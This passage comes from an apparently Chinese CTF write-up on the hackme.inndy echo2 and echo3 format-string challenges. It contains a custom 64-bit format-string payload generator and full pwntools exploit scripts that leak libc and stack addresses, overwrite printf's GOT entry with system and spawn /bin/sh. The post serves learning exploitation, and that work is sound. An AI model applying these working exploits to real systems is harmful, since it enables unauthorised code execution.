class="headerlink" title="构造payload&amp;getshell"></a>构造payload&amp;getshell</h3><p>这算是第一次接触64位的格式化字符串漏洞吧，之前打32位的时候一直用的<code>fmtstr_payload</code>,现在没法用它，感觉少了些什么。</p><p>第一次打的时候是手动构造的payload，但是懒惰成为了第一生产力，我在网上搜了两个64位的<code>fmtstr_payload</code>，其中一个完全不能用，还有一个这道题能用，但是别的题好像就不行了。放一下链接</p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">这道题可用</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">完全打不通</a></p><p><strong>无奈只能仿照着这俩自己写了一个，虽然也是有一定的局限性，还可能有bug，但我测了好几组样例，都正常，当然还有一些地方可以优化，但是太懒了，就懒得鼓捣了。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>然后覆盖就行了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr_payload64</span><span class="params">(offset, src, data,type = <span class="string">'byte'</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成 64 位格式化字符串payload</span></span><br><span class="line"><span class="string">    offset: 偏移</span></span><br><span class="line"><span class="string">    src: 源地址</span></span><br><span class="line"><span class="string">    data: 欲写入内容</span></span><br><span class="line"><span class="string">    type: 目前只支持int、longlong、byte类型，默认为byte</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    data = hex(data).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> type == <span class="string">'int'</span>:</span><br><span class="line">        dataLen = <span class="number">8</span></span><br><span class="line">    <span class="keyword">elif</span> type == <span class="string">'longlong'</span>:</span><br><span class="line">        dataLen = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dataLen = len(data[<span class="number">2</span>:]) <span class="keyword">if</span> len(data[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">else</span> len(data[<span class="number">2</span>:])+<span class="number">1</span></span><br><span class="line">    x = (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> <span class="keyword">if</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>%<span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> (dataLen/<span class="number">2</span>)*<span class="number">12</span>/<span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    data = data[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">'0'</span>)</span><br><span class="line">    curNum = <span class="number">0</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        num = data[<span class="number">-2</span>-(index*<span class="number">2</span>):] <span class="keyword">if</span> index == <span class="number">0</span> <span class="keyword">else</span> data[<span class="number">-2</span>-(index*<span class="number">2</span>):<span class="number">0</span>-(index*<span class="number">2</span>)]</span><br><span class="line">        num = int(num,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">            payload += <span class="string">'%'</span> + str(num) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">            curNum = num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> num &lt;= (curNum&amp;<span class="number">0xff</span>):</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += <span class="string">'%'</span> + str(num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span>) - curNum) + <span class="string">'c%'</span> + str(offset + x + index) + <span class="string">'$hhn'</span></span><br><span class="line">                curNum = num + <span class="number">0x100</span>*(curNum/<span class="number">0x100</span> )</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>*x,<span class="string">'a'</span>)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;dataLen/<span class="number">2</span>:</span><br><span class="line">        payload += p64(src + index)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./echo2')</span></span><br><span class="line">elf = ELF(<span class="string">'./echo2'</span>)</span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28145</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%41$p---'</span> + <span class="string">'%43$p...'</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">elfbase  = int(c.recvuntil(<span class="string">'---'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xa03</span></span><br><span class="line">l_s_m_addr = int(c.recvuntil(<span class="string">'...'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',l_s_m_addr)</span></span><br><span class="line"><span class="comment">#libcbase = l_s_m_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">'system'</span>] + elfbase</span><br><span class="line"><span class="comment">#system = libcbase + libc.dump('system')</span></span><br><span class="line">printf = elf.got[<span class="string">'printf'</span>] + elfbase</span><br><span class="line">success(<span class="string">'printf = '</span> + hex(printf))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload64(offset,printf,system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-echo3"><a href="#0x03-echo3" class="headerlink" title="0x03 echo3"></a>0x03 echo3</h1><p>这道题的远程快给我打吐了。</p><p>应该是BUU上面环境没配置好，远程怎么都打不通，各种exp都试了也不行，但是远程打题目原平台hackme.inndy却能打通。。。</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>第一次接触这类<code>Fmt_bss</code>类型的格式化字符串题目。和前两道题目相比，这道题目</p><ol><li>buf在bss段</li><li>main函数有一处调用了alloca，alloca的参数是个随机值，然后<code>sub esp, eax</code>使得esp被减一个随机的值，导致栈地址比较随机。</li></ol><p>这两点我都是第一次接触，做起来用了挺长时间。</p><p>查阅了大量WP以后，得知这类型(Fmt_bss)的题目有一个套路，就是<code>找跳板</code>，然后覆盖<code>printf_got</code>为<code>system</code>。再传入<code>/bin/sh</code></p><h3 id="找跳板的原因？"><a href="#找跳板的原因？" class="headerlink" title="找跳板的原因？"></a><strong>找跳板的原因？</strong></h3><p><strong>找跳板的原因？</strong>：对于<code>%ac$xn</code>a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。</p><p>即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。</p><h2 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it!"></a>Do it!</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p><strong>在开始之前，有一点需要了解</strong>:在打本地的时候，程序默认加载的是本地默认libc，但是打远程的时候，程序则加载远程默认libc。这道题目原题作者给了<code>libc-2.23.so.i386</code>这个libc和我们正常的<code>libc-2.23.so.i386</code>不太一样。但是<code>使用不同的libc运行时，栈结构有差异，而我们找跳板正是利用了栈结构的一些特性，所以在本地调试的时候就需要通过指定libc，产生与远程相同的栈结构</code>。</p><h3 id="遇到的困难-未解决-3月19号已解决。"><a href="#遇到的困难-未解决-3月19号已解决。" class="headerlink" title="遇到的困难 (未解决)//3月19号已解决。"></a>遇到的困难 (未解决)//3月19号已解决。</h3><p><code>非常不幸</code>，尽管我已经下载下来了作者提供的<code>libc-2.23.so.i386</code>，但是我依旧没办法让程序优先加载这个libc，试了许多方法，包括<code>设置LD_PRELOAD</code>、<code>process(&#39;./echo3&#39;,env = {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so.i386&quot;})</code>、<code>软链接</code>、<code>(这么做之前一定要备份原有的libc)删掉/lib/i386-linux-gnu/libc-2.23.so和libc.so.6，然后用作者给的libc替换libc-2.23.so，然后再用软链接搞出来libc.so.6</code></p><p>这些方法都会导致各种各样的报错，比如<code>段错误</code>、不能加载<code>libc-2.23.so.i386</code>之类的。初步推测是这个<code>libc-2.23.so.i386</code>有点问题？</p><p>如果能在本地通过加载作者给的libc来调试，就能得到准确的偏移，远程应该也就能打得通了。</p><p><strong>但是重在学习fmt_bss类题目的打法，拿不拿得到flag就不是那么重要了，本文将写本地打法</strong></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序本身没有<code>system</code>函数，所以需要先泄露libcbase，然后得到system函数。</p><p>同时也需要泄露栈地址，以便我们找跳板。</p><p>通过跳板修改<code>printf_got</code>为<code>system</code></p><p>传入<code>/bin/sh</code>来getshell</p><h3 id="泄露栈地址和libcbase"><a href="#泄露栈地址和libcbase" class="headerlink" title="泄露栈地址和libcbase"></a>泄露栈地址和libcbase</h3><p>由于程序存在<code>alloca</code>并且<code>sub esp, eax</code>，会导致栈地址的变动。不过有一点非常有意思。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200318190827725.png" alt></p><p>写个程序运算一下，可以发现<code>alloca</code>的参数只有如下可能</p><p><code>[&#39;0x10&#39;, &#39;0x20&#39;, &#39;0x30&#39;, &#39;0x40&#39;, &#39;0x50&#39;, &#39;0x1010&#39;, &#39;0x1020&#39;, &#39;0x1030&#39;, &#39;0x1040&#39;, &#39;0x1050&#39;, &#39;0x2010&#39;, &#39;0x2020&#39;, &#39;0x2030&#39;, &#39;0x2040&#39;, &#39;0x2050&#39;, &#39;0x3010&#39;, &#39;0x3020&#39;, &#39;0x3030&#39;, &#39;0x3040&#39;, &#39;0x3050&#39;]</code></p><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">0x20</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1050</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x1030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x30</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x50</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x40</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3050</span>	<span class="number">2047</span>	<span class="number">0.0165293927649</span></span><br><span class="line">&gt;<span class="number">0x3010</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x1020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3020</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x10</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x3040</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;<span class="number">0x2050</span>	<span class="number">2048</span>	<span class="number">0.0165374677003</span></span><br><span class="line">&gt;<span class="number">0x2030</span>	<span class="number">4096</span>	<span class="number">0.0330749354005</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>从左到右依次是 16进制表示、10进制表示、出现概率。</p><p>我们可以通过多次尝试或者直接在exp里加入控制语句来让这个栈的减少值固定下来。</p><p>在此之前，先来调试一下，看看此时栈有什么特征，以便在exp加入控制语句。</p><p>gdb调试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">08048774                 sub     esp, eax</span><br><span class="line">...</span><br><span class="line">08048646                 call    _printf</span><br></pre></td></tr></table></figure><p>在这两处位置下断，执行到第一个断点的时候<code>set $eax = 0x20</code>，使得esp=0x20,当然也可以选取别的值。</p><p>接着执行，到<code>call printf</code>的时候<code>stack 100</code> 查看栈情况。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318191540.png" alt></p><p>能够看到<code>__libc_start_main + 247</code>,此时其偏移为43 可通过<code>%43$p</code>来打印出来。可以发现其特征为后三位为<code>637</code>，选取后三位是因为这三位是不变的，如果虚拟机开了ASLR，除了后三位以外，其他位置都有可能变。</p><p>通过这个能泄露出libcbase，但还需要泄露出栈地址，这里选择偏移为30的这一处</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192148.png" alt></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29736</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)<span class="comment">#for process()</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')#for remote()</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><h3 id="找跳板"><a href="#找跳板" class="headerlink" title="找跳板"></a>找跳板</h3><p>原理利用了之前讲到的A-&gt;B-&gt;C</p><p>由于刚才已经找到了位于30偏移的栈地址，其地址里存的是位于87偏移的地址，87偏移的地址里面存的是一些其他东西。</p><p>这道题比较巧，栈里面存在<code>_GLOBAL_OFFSET_TABLE_</code>可以覆盖其低位字节来让其指向<code>printf_got</code>。图中这两处偏移分别为20和21</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200318192806.png" alt></p><p>所以跳板流程可以如下表示，为了看起来更舒服，这里用偏移来代替地址。。</p><p>这里<code>_GLOBAL_OFFSET_TABLE_</code>表示的是存放<code>_GLOBAL_OFFSET_TABLE_</code>的栈地址。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----第一步，利用30-------</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;21</span><br><span class="line">-----第二步，利用87-------</span><br><span class="line">修改前</span><br><span class="line">87-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">修改后</span><br><span class="line">87-&gt;21-&gt;printf_got</span><br><span class="line">----第三步，利用21-------</span><br><span class="line">修改前</span><br><span class="line">21-&gt;printf_got</span><br><span class="line">修改后</span><br><span class="line">21-&gt;printf_got-&gt;system</span><br></pre></td></tr></table></figure><p>可以看出，每一步，对应<code>A-&gt;B-&gt;C</code>中A和B位置的都是指针。</p><p><strong>然而，这样由于printf反馈的数据太多了，大概会运行好几分钟。。。而如果打远程的话，恐怕没这么多时间，而且考虑网络因素，这样就算payload正确也很难打通吧</strong></p><p>因此有了改进的payload，每次修改2字节，这样会大大降低数据量。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----第一步----借助30和31</span><br><span class="line">修改前</span><br><span class="line">30-&gt;87-&gt;其他</span><br><span class="line">31-&gt;85-&gt;其他</span><br><span class="line">修改后</span><br><span class="line">30-&gt;87-&gt;20</span><br><span class="line">31-&gt;85-&gt;21</span><br><span class="line">----第二步----借助85和87</span><br><span class="line">修改前</span><br><span class="line">85-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_</span><br><span class="line">87-&gt;20-&gt;_GLOBAL_OFFSET_TABLE_+4</span><br><span class="line">修改后</span><br><span class="line">87-&gt;20-&gt;printf_got</span><br><span class="line">85-&gt;21-&gt;printf_got + 2</span><br><span class="line">----第三步----借助20和21</span><br><span class="line">修改前</span><br><span class="line">20-&gt;printf_got</span><br><span class="line">21-&gt;printf_got + 2</span><br><span class="line">修改后</span><br><span class="line">20-&gt;printf_got-&gt;system后两字节</span><br><span class="line">21-&gt;printf_got + 2-&gt;system前两字节</span><br><span class="line"></span><br><span class="line">//关于这里字节的前后,更博的时候我自己都绕晕了...记录一下</span><br><span class="line">[+] printf_got = 0x804a014</span><br><span class="line">[+] system = 0xf7e3fda0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/4x 0x804a014</span><br><span class="line">0x804a014:	0xa0	0xfd	0xe3	0xf7</span><br><span class="line">pwndbg&gt; x/wx 0x804a014</span><br><span class="line">0x804a014:	0xf7e3fda0</span><br><span class="line">//应该能看明白吧</span><br></pre></td></tr></table></figure><p>第二步挺巧妙的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">0050</span>│  <span class="number">0xffffcfd0</span> —▸ <span class="number">0x804a000</span> (_GLOBAL_OFFSET_TABLE_) —▸ <span class="number">0x8049f10</span> (_DYNAMIC) ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│  <span class="number">0xffffcfd4</span> —▸ <span class="number">0x804a060</span> (magic) ◂— <span class="number">0xadb5e79a</span></span><br></pre></td></tr></table></figure><p>可以看到0xffffcfd0和0xffffcfd0+4所存的地址都是<code>0x804axxx</code>而正好<code>_GLOBAL_OFFSET_TABLE_</code>为<code>0x804a000</code>，<code>不同函数got值前两字节是不变的，改变的只是后两字节</code>，因此我们才有了每次修改两字节的方法。</p><p><strong>这里还有一个细节，我们来看system。</strong></p><p><code>[+] system = 0xf7e3fda0</code></p><p>可以看出 system的前两字节<code>0xf7e3</code>要小于后两字节<code>0xfda0</code>，再想想我们fmt_payload的构造方法，就能得知要先修改值小的前两字节，然后再修改后两字节。</p><hr><p>所以得到代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>,<span class="number">21</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format((system &amp; <span class="number">0xffff</span>) - ((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>),<span class="number">20</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',29736)</span></span><br><span class="line">    c = process(<span class="string">"./echo3"</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__libc_start_main',libc_start_main)</span></span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.dump('__libc_start_main')</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span 